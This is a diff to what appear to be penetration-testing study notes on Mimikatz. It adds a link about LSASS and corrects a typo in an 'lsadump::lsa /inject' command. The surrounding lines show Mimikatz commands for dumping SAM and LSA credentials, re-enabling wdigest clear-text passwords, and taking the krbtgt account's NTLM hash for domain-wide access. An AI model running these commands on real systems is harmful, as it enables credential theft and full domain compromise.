@@ -40,6 +40,8 @@ Mimikatz is an open-source application that allows users to view and save authen
 
         wdigest: Old way Windows stored passwords in memory from 7 and prior. Passwords were stored in clear text here. 8+ fixed this to be hashed by turing off the feature. Mimikatz can turn it back on. Once back on a new logon session will be need to occur.
 
+[Note on what LSA (lsass.exe) is](https://en.wikipedia.org/wiki/Local_Security_Authority_Subsystem_Service)
+
 lsadump::sam /patch
 
 lsadump::lsa /patch
@@ -52,7 +54,7 @@ If this is achieved we have complete access to the domain and every machine.
 
 **Exploit**
 
-    lsadump::lda /inject /name:<kerberos ticket granting account>
+    lsadump::lsa /inject /name:<kerberos ticket granting account>
     
      You want to grab the SID of the domian and the NTLM hash of the account.
      
